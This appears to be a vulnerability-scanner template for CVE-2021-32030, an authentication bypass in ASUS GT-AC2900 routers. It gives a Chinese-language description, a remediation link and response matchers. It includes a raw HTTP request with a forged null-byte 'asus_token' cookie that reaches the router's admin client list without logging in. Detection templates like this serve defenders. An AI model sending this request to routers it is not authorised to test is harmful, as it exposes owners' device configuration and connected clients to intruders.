id: CVE-2021-32030
info:
  name: ASUS GT-AC2900 - Authentication Bypass
  author:
  - gy741
  description: |-
    ASUS GT-AC2900 逻辑漏洞
    ASUS GT-AC2900是中国华硕（ASUS）公司的一个路由器。

    ASUS GT-AC2900 devices 3.0.0.4.386.42643之前版本存在安全漏洞，该漏洞允许管理员应用程序在处理未经认证用户的远程输入时，允许绕过认证，导致未经认证的用户访问管理员界面。
  severity: critical
  remediation: |-
    官方修复方案：<br />1、升级系统至无漏洞版本，或于官网下载安全补丁
    https://www.asus.com/Networking-IoT-Servers/WiFi-Routers/ASUS-Gaming-Routers/RT-AC2900/HelpDesk_BIOS/
requests:
- matchers:
  - type: status
    status:
    - 200
  - type: word
    part: header
    words:
    - application/json
  - type: word
    condition: and
    words:
    - get_cfg_clientlist
    - alias
    - model_name
  matchers-condition: and
  raw:
  - |
    GET /appGet.cgi?hook=get_cfg_clientlist() HTTP/1.1
    Host: {{Hostname}}
    User-Agent: asusrouter--
    Referer: {{BaseURL}}
    Cookie: asus_token=\0Invalid; clickedItem_tab=0
